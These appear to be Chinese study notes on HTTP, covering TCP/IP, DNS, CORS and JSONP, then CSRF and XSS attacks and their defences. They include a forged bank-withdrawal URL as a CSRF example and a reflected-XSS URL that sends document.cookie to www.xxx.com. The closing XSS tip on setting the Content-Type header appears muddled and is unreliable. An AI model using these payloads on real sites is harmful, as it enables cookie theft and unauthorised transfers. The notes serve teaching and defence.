##http 
### 基础 <div id='base'></div>
* 1.网络基础TCP/IP
    * HTTP基于TCP/IP协议族，HTTP属于它内部的一个子集。
    * 把互联网相关联的协议集合起来总称TCP/IP。
* 1.1 TCP/IP分层管理
    * TCP/IP按层次分为：应用层，传输层，网络层和链路层。
        * 应用层：决定了向用户提供应用服务时通信的活动。
            * FTP（文件传输协议），DNS（域名系统），HTTP（超文本传输协议）
        * 传输层：提供处于网络连接中的两台计算机之间的数据传输。
            * TCP（传输控制协议），UDP（用户数据报协议）
        * 网络层（网络互联层）：用来处理网络上流动的数据包。数据包是网络传输的最小单位。该层规定了通过怎样的路径到达对方计算机，并把数据包传送给对方。
        * 链路层（网络接口层）：出来处理连接网络的硬件部分。
* 1.2 与HTTP关系密切的协议：IP、TCP和DNS
    * IP：将数据包传输给对方，两个重要条件：IP地址和MAC地址。
        * IP地址指明了节点被分配到到地址，MAC地址是指网卡所属固定地址。IP地址可以和MAC地址进行配对。IP地址可以变换，但MAC地址基本上不会更改。
    * ARP协议凭借MAC地址进行通信：网络上两台计算机进行通信，通常要经过多台计算机和网络设备中转才能连接到对方。
    在中转时，会利用下一站中转设备的MAC地址来搜索下一个中转目标。这时采用ARP（地址解析协议），根据通信放的IP可以反查出对应MAC地址。
* 1.3 TCP协议：将大块数据分割以报文段为单位进行数据传输。
    * 确保数据能到达目标：TCP协议采用了三次握手
        * 客户端发送SYN=1（表示请求连接），并发送一个seq（随机码）
        * 服务器由于收到SYN=1，知道是请求连接，返回一个ACK=1（表示确认），并同返回一个请求连接SYN=1，然后返回一个ack=seq+1（客户端随机码应答），且自己也返回一个seq（随机码）
        * 客户端收到服务器的ack后验证，向服务器确认包发送ack=seq+1（服务器随机码应答）
        * 服务器确认ack后建立连接，完成三次握手。
* 1.4 域名解析系统DNS
    * 主机名/域名（例如：www.hackr.jp）不利于计算机解析，故计算机需要一串数字（类似20x.22.3.3）来查找服务器。
* 1.5 URI和URL
    * URI：统一资源标识符。
    * Uniform：规定统一的格式可方便处理多种不同类型的资源。
    * Resource：可以被标识的任何东西（文档，图片，音乐，视频等），能够区别于其他类型的，全都可作为资源。资源不仅可以是单一的，也可以是多数的集合体。
    * Identifier：标识符。
    * 综上：URI就是由某个协议方案表示的资源的定位标识符。协议方案是指访问资源所使用的协议类型。
    * URL：统一资源定位符。（URI表示某一互联网资源，而URL表示资源的地点，可见URL是URI的子集）。
    * URI格式： 绝对URI，绝对URL，相对URL（从浏览器中基本URI处指定URL）。
  


### 跨域 <div id='cross_domain'></div>
* 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 
是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。
* 什么是跨域HTTP请求
    * HTML中a/form/img/css/script/iframe/ajax都可以指向资源
发起请求的资源所在域不同于该请求所指向资源所在的域的HTTP请求就叫做跨域HTTP请求
* 何为不同域
    * 协议+域名+端口号都相同才是同域
* 跨域请求带来的问题
    * 如果对跨域请求不做限制，会有安全隐患
    * 例1：
        * 一个恶意网站的页面通过iframe嵌入了支付宝的登录页面（两者不同域），如果没有任何限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码
    * 例2：
        * 跨域请求别人的AJAX登录接口，也可以获取到用户名密码

* 如何限制跨域请求
```
不允许跨域请求
    NO
服务端
    可以根据相关的HEADER判断来源，限制访问
    但是HEADER可以伪造
浏览器
    发起跨域请求时，进行限制
    同源策略

```
* 同源策略
```
是浏览器的一种约定和安全功能，对跨域请求进行控制
    1：限制来自不同源的document或脚本，对当前document读取或设置某些属性
    2：禁止ajax直接发起跨域HTTP请求（其实可以发送请求，结果被浏览器拦截，不展示）
    3：允许img/css/script(拥有src的标签都有跨域的能力。加载下来就属于当前域了)
    4：允许跨域的连接、跳转、表单提交（带来了跨站请求伪造CSRF问题）
```
* 同源策略的作用
```
解决了例1里面的问题：
    恶意网站的JS无法读取iframe里面的内容
    因为iframe加载之后属于单独的一个window当然也是一个单独的document
解决了例2里面的问题：
    发起的AJAX请求结果如何被浏览器屏蔽了，虽然实际请求已经发送到服务端，但是不知道结果（所以服务端也要有相应的策略）
```
* 如何越过限制
```
在此不讨论JS如何读取iframe的document元素的问题.只涉及如何越过浏览器限制，发起AJAX跨域请求并显示结果
AJAX跨域请求实现方式:
1：通过代理
    自己的服务器实现接口，后台调用其他域的接口
2：JSONP
    服务端调用本地js，并将结果带回
3：CORS
    扩展HTTP协议，根据服务端返回的有关HEADER来决定是否展示结果
```
* JSONP
```
JSON Padding
JSON是一种数据交换格式，JSONP是一种ajax跨域实现方案
    1：script不受同源策略限制能加载到
    2：demo.js里面能调用本地的js方法
这就是JSONP(可能不准确…)
jquery等已经对jsonp进行了很好的实现与封装，可以google一下，不做过多介绍
缺点是：
    1：服务端需要指定JS的方法名
    2：只支持GET
```
* CORS
```
跨源资源共享 Cross-Origin Resource Sharing
是一个规范，可以简单理解为对HTTP协议进行了扩展，增加了一些http header，让服务器能声明那些来源可以通过浏览器访问该服务器上的资源
Request headers
    • Origin
    • Access-Control-Request-Method
    • Access-Control-Request-Headers
    Response headers
    • Access-Control-Allow-Origin
    • Access-Control-Allow-Credentials
    • Access-Control-Expose-Headers
    • Access-Control-Max-Age
    • Access-Control-Allow-Methods
    • Access-Control-Allow-Headers
头部介绍
    Origin
        参数origin是一个URI,告诉服务器端,请求来自哪里.
        浏览器发起http请求时一般都会设置这个头，不是CORS特有
    Access-Control-Request-Method
        在发出预检请求时,告诉服务器在实际请求时使用的请求方式
    Access-Control-Request-Headers
        在发出预检请求时,告诉服务器在实际请求时携带的自定义头信息.如有多个,可以用逗号分开
    Access-Control-Allow-Origin
        指定一个允许向该服务器提交请求的URI.对于一个不带有credentials的请求,可以指定为*,表示允许来自所有域的请求.
    Access-Control-Expose-Headers
        指明允许脚本访问的响应头
    Access-Control-Max-Age
        缓存此次请求的秒数。在这个时间范围内，所有同类型的请求都将不再发送预检请求而是直接使用此次返回的头作为判断依据
    Access-Control-Allow-Credentials
        是否允许请求带有Cookie信息
    Access-Control-Allow-Methods
        在响应预检请求的时候使用.指明资源可以被请求的方式有哪些(一个或者多个).
    Access-Control-Allow-Headers
        在响应预检请求的时候使用.用来指明在实际的请求中,可以使用哪些自定义HTTP请求头
CORS如何跨域
    简单的HTTP请求
        只使用 GET, HEAD 或者 POST 请求方法。如果使用 POST 向服务器端传送数据，则数据类型(Content-Type)只能是 
        application/x-www-form-urlencoded, multipart/form-data 或 text/plain中的一种。 不会使用自定义请求头（类似于 X-Modified 这种）
         直接发起请求
    复杂的HTTP请求
        浏览器必须先以 OPTIONS 请求方式发送一个预请求(preflight request)，从而获知服务器端对跨源请求所支持 HTTP 方法。
        在确认服务器允许该跨源请求的情况下，以实际的 HTTP 请求方法发送那个真正的请求。服务器端也可以通知客户端，是不是
        需要随同请求一起发送信用信息（包括 Cookies 和 HTTP 认证相关数据）
CORS的实现
    1：现在大多数浏览器都支持
    2：服务端程序可以自己设置cors的响应头，java里面可以通过servlet的filter
    3：SpringMVC对cors的支持
```

* 根据HTTP标准，HTTP请求可以使用多种请求方法。
    * HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。
    * HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。
    ```
    序号	方法	描述
    1	GET	请求指定的页面信息，并返回实体主体。
    2	HEAD	类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头
    3	POST	向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。
    4	PUT	从客户端向服务器传送的数据取代指定的文档的内容。
    5	DELETE	请求服务器删除指定的页面。
    6	CONNECT	HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。
    7	OPTIONS	允许客户端查看服务器的性能。
    8	TRACE	回显服务器收到的请求，主要用于测试或诊断。
    ```
* HTTP状态码分类
    * HTTP状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP状态码共分为5种类型：
    ```
    HTTP状态码分类
    分类	分类描述
    1**	信息，服务器收到请求，需要请求者继续执行操作
    2**	成功，操作被成功接收并处理
    3**	重定向，需要进一步的操作以完成请求
    4**	客户端错误，请求包含语法错误或无法完成请求
    5**	服务器错误，服务器在处理请求的过程中发生了错误
    ```


### CSRF <div id='csrf'></div>
* 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF。
* CSRF 攻击实例
    ```
      CSRF 攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作。
    
    比如说，受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 http://bank.example/withdraw?account=bob&amount=1000000&for=bob2 
    
    可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，
    
    并且该 session 的用户 Bob 已经成功登陆。黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。
    
    Mallory 可以自己发送一个请求给银行：http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory。但是这个请求来自 Mallory 
    
    而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入
    
    如下代码： src=”http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory ”，并且通过广告等诱使 Bob 来访问他的网站。
    
    当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，
    
    该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，
    
    浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，
    
    而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，
    
    没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。
    ```

* CSRF 攻击的对象
    ```
      在讨论如何抵御 CSRF 之前，先要明确 CSRF 攻击的对象，也就是要保护的对象。从以上的例子可知，CSRF 攻击是黑客借助受害者的 cookie 
    
    骗取服务器的信任，但是黑客并不能拿到 cookie，也看不到 cookie 的内容。另外，对于服务器返回的结果，由于浏览器同源策略的限制，
    
    黑客也无法进行解析。因此，黑客无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，
    
    在服务器端直接改变数据的值，而非窃取服务器中的数据。所以，我们要保护的对象是那些可以直接产生数据改变的服务，而对于读取数据的
    
    服务，则不需要进行 CSRF 的保护。比如银行系统中转账的请求会直接改变账户的金额，会遭到 CSRF 攻击，需要保护。而查询余额是对金额
    
    的读取操作，不会改变数据，CSRF 攻击无法解析服务器返回的结果，无需保护。
    ```
* 当前防御 CSRF 的几种策略
* 在业界目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。
下面就分别对这三种策略进行详细介绍。

* CSRF 防御方法选择之道
    ```
    通过上文讨论可知，目前业界应对 CSRF 攻击有一些克制方法，但是每种方法都有利弊，没有一种方法是完美的。如何选择合适的方法非常重要。
    如果网站是一个现有系统，想要在最短时间内获得一定程度的 CSRF 的保护，那么验证 Referer 的方法是最方便的，要想增加安全性的话，
    可以选择不支持低版本浏览器，毕竟就目前来说，IE7+, FF3+ 这类高版本浏览器的 Referer 值还无法被篡改。
    
    如果系统必须支持 IE6，并且仍然需要高安全性。那么就要使用 token 来进行验证，在大部分情况下，使用 XmlHttpRequest 并不合适，
    token 只能以参数的形式放于请求之中，若你的系统不支持用户自己发布信息，那这种程度的防护已经足够，否则的话，你仍然难以防范 
    token 被黑客窃取并发动攻击。在这种情况下，你需要小心规划你网站提供的各种服务，从中间找出那些允许用户自己发布信息的部分，
    把它们与其他服务分开，使用不同的 token 进行保护，这样可以有效抵御黑客对于你关键服务的攻击，把危害降到最低。毕竟，
    删除别人一个帖子比直接从别人账号中转走大笔存款严重程度要轻的多。
    
    如果是开发一个全新的系统，则抵御 CSRF 的选择要大得多。笔者建议对于重要的服务，可以尽量使用 XMLHttpRequest 来访问，
    这样增加 token 要容易很多。另外尽量避免在 js 代码中使用复杂逻辑来构造常规的同步请求来访问需要 CSRF 保护的资源，
    比如 window.location 和 document.createElement(“a”) 之类，这样也可以减少在附加 token 时产生的不必要的麻烦。
    
    最后，要记住 CSRF 不是黑客唯一的攻击手段，无论你 CSRF 防范有多么严密，如果你系统有其他安全漏洞，比如跨站域脚本攻击 XSS，
    那么黑客就可以绕过你的安全防护，展开包括 CSRF 在内的各种攻击，你的防线将如同虚设。
    ```

### XSS <div id='xss'></div>
* 动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting, 安全专家们通常将其缩写成 XSS）的威胁，而静态站点则完全不受其影响。
* XSS攻击：跨站脚本攻击(Cross-Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。
    * XSS是一种常见的web安全漏洞，它允许攻击者将恶意代码植入到提供给其它用户使用的页面中。
    * 不同于大多数攻击(一般只涉及攻击者和受害者)，XSS涉及到三方，即攻击者、客户端与Web应用。
    * XSS的攻击目标是为了盗取存储在客户端的cookie或者其他网站用于识别客户端身份的敏感信息。一旦获取到合法用户的信息后，攻击者甚至可以假冒合法用户与网站进行交互。
* XSS通常可以分为两大类：
    * 一类是存储型XSS，主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。
    * 另一类是反射型XSS，主要做法是将脚本代码加入URL地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。
* XSS目前主要的手段和目的如下：
    ```
    盗用cookie，获取敏感信息。
    利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。
    利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击者）用户的身份执行一些管理动作，或执行一些如:发微博、加好友、发私信等常规操作，前段时间新浪微博就遭遇过一次XSS。
    利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。
    在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果
    ```
* XSS的原理
    * Web应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入HTML代码(最主要的是“>”、“<”)，
    并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致XSS漏洞的产生原因。

    * 接下来以反射性XSS举例说明XSS的过程：
    ```
    现在有一个网站，根据参数输出用户的名称，例如访问url：http://127.0.0.1/?name=astaxie，就会在浏览器输出如下信息：
    hello astaxie
    
    如果我们传递这样的url：http://127.0.0.1/?name=&#60;script&#62;alert(&#39;astaxie,xss&#39;)&#60;/script&#62;,
    
    这时你就会发现浏览器跳出一个弹出框，这说明站点已经存在了XSS漏洞。那么恶意用户是如何盗取Cookie的呢？与上类似，
    
    如下这样的url：http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'
    +document.cookie&#60;/script&#62;，这样就可以把当前的cookie发送到指定的站点：www.xxx.com。你也许会说，
    
    这样的URL一看就有问题，怎么会有人点击？，是的，这类的URL会让人怀疑，但如果使用短网址服务将之缩短，
    
    你还看得出来么？攻击者将缩短过后的url通过某些途径传播开来，不明真相的用户一旦点击了这样的url，
    
    相应cookie数据就会被发送事先设定好的站点，这样子就盗得了用户的cookie信息，然后就可以利用Websleuth之类的
    
    工具来检查是否能盗取那个用户的账户。
    ```
* 如何预防XSS
    * 很简单，坚决不要相信用户的任何输入，并过滤掉输入中的所有特殊字符。这样就能消灭绝大部分的XSS攻击。
    * 目前防御XSS主要有如下几种方式：
        * 过滤特殊字符
            * 避免XSS的方法之一主要是将用户所提供的内容进行过滤。
        * 使用HTTP头指定类型
            * header("Content-Type","text/javascript");
            * 这样就可以让浏览器解析javascript代码，而不会是html输出。

